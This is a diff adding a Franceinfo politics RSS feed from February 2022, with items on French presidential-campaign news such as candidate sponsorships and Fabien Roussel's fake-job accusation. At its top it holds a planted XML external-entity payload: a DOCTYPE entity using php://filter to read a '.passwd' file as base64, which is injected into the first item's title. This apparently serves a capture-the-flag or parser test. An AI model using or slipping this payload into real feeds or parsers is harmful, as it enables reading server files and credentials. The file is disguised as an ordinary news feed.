@@ -1,0 +1,174 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=.passwd"> ]>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Franceinfo - XD - Toute l'actualité politique en France</title>
+    <description>Franceinfo - Politique - Toute l'actualité politique en France</description>
+    <pubDate>Thu, 24 Feb 2022 10:04:07 +0100</pubDate>
+    <generator>francetvinfo 2022 (https://www.francetvinfo.fr)</generator>
+    <link>https://www.francetvinfo.fr/politique/</link>
+    <atom:link rel="self" type="application/rss+xml" href="https://www.francetvinfo.fr/politique.rss"/>
+    <item>
+      <title>&xxe;</title>
+      <description><![CDATA[Fabien Roussel, candidat du Parti communiste à l'élection présidentielle, était l'invité des "4 Vérités" sur France 2, jeudi 24 février.]]></description>
+      <pubDate>Thu, 24 Feb 2022 10:04:03 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/elections/presidentielle/candidats/accusation-d-emploi-fictif-je-vais-publier-des-elements-et-temoignages-que-jean-jacques-candelier-m-a-communiques-se-defend-fabien-roussel_4978857.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/elections/presidentielle/candidats/accusation-d-emploi-fictif-je-vais-publier-des-elements-et-temoignages-que-jean-jacques-candelier-m-a-communiques-se-defend-fabien-roussel_4978857.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="19465" url="https://www.francetvinfo.fr/image/7611jcwsn-8c7e/600/337/26480112.png"/>
+    </item>
+    <item>
+      <title>ENQUÊTE. Fabien Roussel accusé d'emploi fictif : sa défense mise à mal par des syndicalistes</title>
+      <description><![CDATA[Fabien Roussel se défend d'avoir bénéficié d'un emploi fictif en tant qu'assistant parlementaire expliquant avoir réalisé&nbsp;un&nbsp;"travail de terrain" avec ceux qui manifestaient contre des fermetures d'usine. Le problème est que les responsables syndicaux des sites en question ne se souviennent pas du tout l'avoir vu.]]></description>
+      <pubDate>Thu, 24 Feb 2022 07:43:53 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/politique/parti-communiste-francais/enquete-fabien-roussel-accuse-d-emploi-fictif-sa-defense-mise-a-mal-par-des-syndicalistes_4977744.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/politique/parti-communiste-francais/enquete-fabien-roussel-accuse-d-emploi-fictif-sa-defense-mise-a-mal-par-des-syndicalistes_4977744.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="12091" url="https://www.francetvinfo.fr/image/7611irik6-a548/500/281/26476467.jpg"/>
+    </item>
+    <item>
+      <title>Présidentielle : le parti LR va saisir la justice contre le journal "Libération", après son enquête sur des soupçons de fraudes pendant la primaire</title>
+      <description><![CDATA[Le journal "Libération" a publié une enquête révélant la présence d'adhérents fictifs ou morts dans les rangs des Républicains, ayant voté pour la primaire.]]></description>
+      <pubDate>Wed, 23 Feb 2022 21:40:18 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/politique/les-republicains/primaire-de-la-droite/presidentielle-le-parti-lr-va-saisir-la-justice-contre-le-journal-liberation-apres-son-enquete-sur-des-soupcons-de-fraudes-pendant-la-primaire_4977567.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/politique/les-republicains/primaire-de-la-droite/presidentielle-le-parti-lr-va-saisir-la-justice-contre-le-journal-liberation-apres-son-enquete-sur-des-soupcons-de-fraudes-pendant-la-primaire_4977567.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="12693" url="https://www.francetvinfo.fr/image/7611iqiw0-f2f6/500/281/26474604.jpg"/>
+    </item>
+    <item>
+      <title>Présidentielle : Nicolas Dupont-Aignan "choqué" que François Bayrou "réserve" sa bourse des parrainnages à "trois candidats"</title>
+      <description><![CDATA[Le candidat du parti Debout la France demande à&nbsp;François Bayrou "d'offrir à tous les candidats les parrainages que les maires pourraient lui donner" et affirme&nbsp;avoir actuellement "480 parrainages dans les tuyaux".&nbsp;]]></description>
+      <pubDate>Wed, 23 Feb 2022 20:25:24 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/replay-radio/19h20-politique/presidentielle-nicolas-dupont-aignan-choque-que-francois-bayrou-reserve-sa-bourse-des-parrainnages-a-trois-candidats_4950498.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/replay-radio/19h20-politique/presidentielle-nicolas-dupont-aignan-choque-que-francois-bayrou-reserve-sa-bourse-des-parrainnages-a-trois-candidats_4950498.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="16150" url="https://www.francetvinfo.fr/image/7611ir1ye-46f8/500/281/26475576.jpg"/>
+    </item>
+    <item>
+      <title>Accusation de viols contre le conseiller d'Eric Zemmour Olivier Ubéda : la plainte est classée sans suite</title>
+      <description><![CDATA[Le conseiller événements d'Eric Zemmour était&nbsp;visé par une plainte d'un jeune homme, qui l'accusait&nbsp;de plusieurs viols commis entre le printemps et l'automne 2021.&nbsp;]]></description>
+      <pubDate>Wed, 23 Feb 2022 20:01:03 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/elections/presidentielle/candidats/accusation-de-viols-contre-le-conseiller-d-eric-zemmour-olivier-ubeda-la-plainte-est-classee-sans-suite_4977702.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/elections/presidentielle/candidats/accusation-de-viols-contre-le-conseiller-d-eric-zemmour-olivier-ubeda-la-plainte-est-classee-sans-suite_4977702.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="10088" url="https://www.francetvinfo.fr/image/7611iqxz3-36c5/500/281/26475468.jpg"/>
+    </item>
+    <item>
+      <title>Présidentielle 2022 : Yannick Jadot, Fabien Roussel et Anne Hidalgo livrent leur vision de la démocratie devant le Cese</title>
+      <description><![CDATA[Mercredi, Yannick Jadot, Fabien Roussel et Anne Hidalgo se sont succédé pour évoquer leurs projets face aux&nbsp;enjeux démocratiques en France,&nbsp;notamment la participation des citoyens.]]></description>
+      <pubDate>Wed, 23 Feb 2022 19:34:08 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/elections/presidentielle/direct-presidentielle-2022-le-cese-auditionne-les-candidats-au-sujet-de-leur-vision-de-la-democratie_4977210.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/elections/presidentielle/direct-presidentielle-2022-le-cese-auditionne-les-candidats-au-sujet-de-leur-vision-de-la-democratie_4977210.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="25516" url="https://www.francetvinfo.fr/image/7611iqvxs-0df9/500/281/26471418.jpg"/>
+    </item>
+    <item>
+      <title>Présidentielle 2022 : Emmanuel Macron sera en meeting à Marseille le 5 mars</title>
+      <description><![CDATA[Emmanuel Macron n'est pas encore candidat aux élections présidentielles, mais la date de son premier meeting a été rendue publique, dans la matinée&nbsp;du mercredi 23 février.&nbsp;
+]]></description>
+      <pubDate>Wed, 23 Feb 2022 17:17:38 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/elections/presidentielle/presidentielle-2022-emmanuel-macron-sera-en-meeting-a-marseille-le-5-mars_4977492.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/elections/presidentielle/presidentielle-2022-emmanuel-macron-sera-en-meeting-a-marseille-le-5-mars_4977492.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="15340" url="https://www.francetvinfo.fr/image/7611iqflz-9d31/500/281/26473794.jpg"/>
+    </item>
+    <item>
+      <title>Présidentielle 2022 : Emmanuel Macron organise son premier meeting à Marseille le 5 mars</title>
+      <description><![CDATA[Emmanuel Macron n'a toujours pas annoncé officiellement sa candidature, mais on sait déjà qu'il tiendra un premier grand meeting, le samedi 5 mars à Marseille. En direct du Palais de l’Élysée, la journaliste Catherine Demangeat&nbsp;apporte des précisions.&nbsp;]]></description>
+      <pubDate>Wed, 23 Feb 2022 17:16:20 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/politique/emmanuel-macron/presidentielle-2022-emmanuel-macron-organise-son-premier-meeting-a-marseille-le-5-mars_4977489.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/politique/emmanuel-macron/presidentielle-2022-emmanuel-macron-organise-son-premier-meeting-a-marseille-le-5-mars_4977489.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="23711" url="https://www.francetvinfo.fr/image/7611iqfj6-a93a/500/281/26473767.png"/>
+    </item>
+    <item>
+      <title>"Elysée 2022, le débrief". Invité : Jean-Luc Mélenchon</title>
+      <description><![CDATA[Le 10&nbsp;février 2022,&nbsp;en deuxième partie de soirée, après la prestation de Jean-Luc Mélenchon, les téléspectateurs retrouvent "Elysée 2022, le débrief", présenté par Nathalie Saint-Cricq.&nbsp;]]></description>
+      <pubDate>Wed, 23 Feb 2022 15:56:58 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/replay-magazine/france-2/elysee-2022/elysee-2022-du-jeudi-10-fevrier-2022_4975761.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/replay-magazine/france-2/elysee-2022/elysee-2022-du-jeudi-10-fevrier-2022_4975761.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="31493" url="https://www.francetvinfo.fr/image/7611i52it-7842/500/281/26463912.jpg"/>
+    </item>
+    <item>
+      <title>Parrainages pour la présidentielle : la réunion avec les élus locaux voulue par Premier ministre est annulée</title>
+      <description><![CDATA[La réunion sera remplacée par des échanges épistolaires, a indiqué le porte-parole du gouvernement Gabriel Attal.]]></description>
+      <pubDate>Wed, 23 Feb 2022 15:04:27 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/politique/jean-castex/gouvernement-de-jean-castex/info-franceinfo-parrainages-l-association-des-maires-de-france-ne-participera-pas-a-la-reunion-sur-le-sujet-prevue-jeudi-a-matignon_4977192.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/politique/jean-castex/gouvernement-de-jean-castex/info-franceinfo-parrainages-l-association-des-maires-de-france-ne-participera-pas-a-la-reunion-sur-le-sujet-prevue-jeudi-a-matignon_4977192.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="13881" url="https://www.francetvinfo.fr/image/7611ipyy2-e14e/500/281/26472201.jpg"/>
+    </item>
+    <item>
+      <title>Le Parlement valide la nomination de la ministre Jacqueline Gourault au Conseil constitutionnel</title>
+      <description><![CDATA[Emmanuel Macron avait proposé&nbsp;la ministre de la Cohésion des territoires pour intégrer le Conseil constitutionnel. Plusieurs élus ont reproché à la ministre&nbsp;son absence de formation en droit.]]></description>
+      <pubDate>Wed, 23 Feb 2022 14:33:13 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/politique/le-parlement-valide-la-nomination-de-la-ministre-jacqueline-gourault-au-conseil-constitutionnel_4977264.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/politique/le-parlement-valide-la-nomination-de-la-ministre-jacqueline-gourault-au-conseil-constitutionnel_4977264.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="17385" url="https://www.francetvinfo.fr/image/7611iptop-07d2/500/281/26471688.jpg"/>
+    </item>
+    <item>
+      <title>VIDEO. Crise en Ukraine : le point de vue de Jean-Luc Mélenchon</title>
+      <description><![CDATA[Il est contre les sanctions, et il souhaite sortir de l'OTAN, voici ce qu'a déclaré le candidat de la présidentielle 2022, Jean-Luc Mélenchon, sur la crise entre l'Ukraine et la Russie.]]></description>
+      <pubDate>Wed, 23 Feb 2022 13:59:18 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/monde/europe/manifestations-en-ukraine/video-crise-en-ukraine-le-point-de-vue-de-jean-luc-melenchon_4977276.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/monde/europe/manifestations-en-ukraine/video-crise-en-ukraine-le-point-de-vue-de-jean-luc-melenchon_4977276.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="19328" url="https://www.francetvinfo.fr/image/7611ipnbz-f36a/500/281/26471607.png"/>
+    </item>
+    <item>
+      <title>VIDEO. Droit de vote à 16 ans : ce que dit Jean-Luc Mélenchon</title>
+      <description><![CDATA[Voici pourquoi Jean-Luc Mélenchon, candidat de la France insoumise à la présidentielle 2022, est pour abaisser le droit de vote à 16 ans et rendre le vote obligatoire dès 18 ans.
+]]></description>
+      <pubDate>Wed, 23 Feb 2022 13:33:47 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/elections/presidentielle/video-droit-de-vote-a-16-ans-ce-que-dit-jean-luc-melenchon_4977258.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/elections/presidentielle/video-droit-de-vote-a-16-ans-ce-que-dit-jean-luc-melenchon_4977258.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="17254" url="https://www.francetvinfo.fr/image/7611ipltj-1f45/500/281/26471472.png"/>
+    </item>
+    <item>
+      <title>Anna, 24 ans : "Voter, c'est une question de survie quand on est une personne discriminée"</title>
+      <description><![CDATA[Tous les jours, Manon Mella donne la parole aux jeunes de 18-30&nbsp;ans. Mercredi 23 février, rencontre avec Anna, 24 ans, étudiant à Lille.]]></description>
+      <pubDate>Wed, 23 Feb 2022 13:29:04 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/replay-radio/generation-2022/anna-24-ans-voter-c-est-une-question-de-survie-quand-on-est-une-personne-discriminee_4950471.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/replay-radio/generation-2022/anna-24-ans-voter-c-est-une-question-de-survie-quand-on-est-une-personne-discriminee_4950471.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="24787" url="https://www.francetvinfo.fr/image/7611i4751-7d9b/500/281/26460672.jpg"/>
+    </item>
+    <item>
+      <title>Présidentielle : Emmanuel Macron tiendra son premier meeting de campagne le 5 mars à Marseille</title>
+      <description><![CDATA[Le chef de l'Etat sortant doit officialiser sa candidature la semaine du 28 février.]]></description>
+      <pubDate>Wed, 23 Feb 2022 12:43:00 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/politique/la-republique-en-marche/presidentielle-emmanuel-macron-tiendra-son-premier-meeting-de-campagne-le-5-mars-a-marseille_4977126.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/politique/la-republique-en-marche/presidentielle-emmanuel-macron-tiendra-son-premier-meeting-de-campagne-le-5-mars-a-marseille_4977126.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="13491" url="https://www.francetvinfo.fr/image/7611gxyz9-acdc/500/281/26445282.jpg"/>
+    </item>
+    <item>
+      <title>Présidentielle 2022 : Faute de parrainages suffisants, Marine Le Pen suspend sa campagne sur le terrain</title>
+      <description><![CDATA[À dix jours de la date butoir pour déposer l’intégralité des parrainages, Marine Le Pen suspend sa campagne sur le terrain faute d’avoir déjà obtenu les 500 signatures nécessaires.]]></description>
+      <pubDate>Wed, 23 Feb 2022 12:10:38 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/elections/presidentielle/presidentielle-2022-faute-de-parrainages-suffisants-marine-le-pen-suspend-sa-campagne-sur-le-terrain_4977135.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/elections/presidentielle/presidentielle-2022-faute-de-parrainages-suffisants-marine-le-pen-suspend-sa-campagne-sur-le-terrain_4977135.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="24833" url="https://www.francetvinfo.fr/image/7611irskj-4f5f/500/281/26470554.png"/>
+    </item>
+    <item>
+      <title>Présidentielle 2022 : le doute plane sur les parrainages de certains candidats</title>
+      <description><![CDATA[À dix jours du délai légal de dépôt de la liste complète des 500 parrainages, plusieurs candidats sont encore loin du compte.&nbsp;]]></description>
+      <pubDate>Wed, 23 Feb 2022 12:05:50 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/elections/presidentielle/presidentielle-2022-le-doute-plane-sur-les-parrainages-de-certains-candidats_4977132.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/elections/presidentielle/presidentielle-2022-le-doute-plane-sur-les-parrainages-de-certains-candidats_4977132.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="12518" url="https://www.francetvinfo.fr/image/7611irsu9-ea2f/500/281/26470581.png"/>
+    </item>
+    <item>
+      <title>Le système des parrainages pour la présidentielle et les sanctions contre la Russie... Le "8h30 franceinfo" de Bruno Retailleau</title>
+      <description><![CDATA[Le patron des sénateurs Les Républicains a notamment réagi aux difficultés que rencontrent&nbsp;Marine Le Pen et Jean-Luc Mélenchon&nbsp;pour réunir les 500 signatures d'élus.]]></description>
+      <pubDate>Wed, 23 Feb 2022 11:49:39 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/replay-radio/8h30-fauvelle-dely/le-systeme-des-parrainages-pour-la-presidentielle-et-les-sanctions-contre-la-russie-le-8h30-franceinfo-de-bruno-retailleau_4950519.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/replay-radio/8h30-fauvelle-dely/le-systeme-des-parrainages-pour-la-presidentielle-et-les-sanctions-contre-la-russie-le-8h30-franceinfo-de-bruno-retailleau_4950519.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="25809" url="https://www.francetvinfo.fr/image/7611irkjr-4f8a/500/281/26469933.jpg"/>
+    </item>
+    <item>
+      <title>Les sanctions contre la Russie et la course aux parrainages pour la présidentielle... Les informés du matin du 23 février</title>
+      <description><![CDATA[Tous les matins, les informés débattent des sujets qui font ou feront l'actualité du jour.]]></description>
+      <pubDate>Wed, 23 Feb 2022 10:49:41 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/replay-radio/les-informes-du-matin/les-sanctions-contre-la-russie-et-la-course-aux-parrainages-pour-la-presidentielle-les-informes-du-matin-du-23-fevrier_4950504.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/replay-radio/les-informes-du-matin/les-sanctions-contre-la-russie-et-la-course-aux-parrainages-pour-la-presidentielle-les-informes-du-matin-du-23-fevrier_4950504.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="24548" url="https://www.francetvinfo.fr/image/7611irjs5-c51d/500/281/26469852.jpg"/>
+    </item>
+    <item>
+      <title>VIDEO. Parrainages : le patron des sénateurs LR, Bruno Retailleau, veut "l'anonymat complet" pour les élus</title>
+      <description><![CDATA[Bruno Retailleau appelle sur franceinfo à changer "totalement" la loi sur les parrainages alors que Marine Le Pen, Éric Zemmour ou Jean-Luc Mélenchon peinent à réunir les 500 signatures obligatoires pour être candidat à l'élection présidentielle.]]></description>
+      <pubDate>Wed, 23 Feb 2022 10:48:24 +0100</pubDate>
+      <link>https://www.francetvinfo.fr/elections/presidentielle/video-parrainages-le-patron-des-senateurs-lr-bruno-retailleau-veut-l-anonymat-complet-pour-les-elus_4976976.html#xtor=RSS-3-[politique]</link>
+      <guid>https://www.francetvinfo.fr/elections/presidentielle/video-parrainages-le-patron-des-senateurs-lr-bruno-retailleau-veut-l-anonymat-complet-pour-les-elus_4976976.html#xtor=RSS-3-[politique]</guid>
+      <enclosure type="image/jpeg" length="14952" url="https://www.francetvinfo.fr/image/7611irdlg-7888/500/281/26469393.jpg"/>
+    </item>
+  </channel>
+</rss>
